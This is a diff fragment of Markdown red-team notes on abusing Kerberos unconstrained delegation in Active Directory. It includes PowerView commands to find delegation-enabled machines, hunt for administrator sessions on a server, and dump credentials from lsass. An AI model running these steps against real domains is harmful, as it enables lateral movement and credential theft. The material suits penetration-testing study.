@@ -593,9 +593,9 @@ Basically this means if we have compromised a service account/machine and a Doma
 Once TGS with Delegation enabled is received by the service machine, the TGT extracted and stored in the machine’s lsass process. This means if we have localadmin on the service machine, we can obtain this TGT hash by dumping creds from lsass.
 
 
-#### Unconstrained Delegation
+# Unconstrained Delegation
 NOTE: Domain Controllers will always report as having delegation enabled.
-
+#### Find Machines with Unconstrained Delegation
 ```Get-DomainComputer -UnConstrained```
 
 OR Using ActiveDirectory module:
@@ -606,7 +606,9 @@ OR Using ActiveDirectory module:
 
 #### Compromise the server(s) where unconstrained delegation is enabled 
 ```Enter-PSSesstion -ComputerName appsrv01```
+
 ```Find-LocalAdminAccess```
+
 ```Invoke-UserHunter -ComputerName appsrv01 -Poll 100 -UserName Administrator -Delay 5 -verbose```
 
 #### Dump creds 
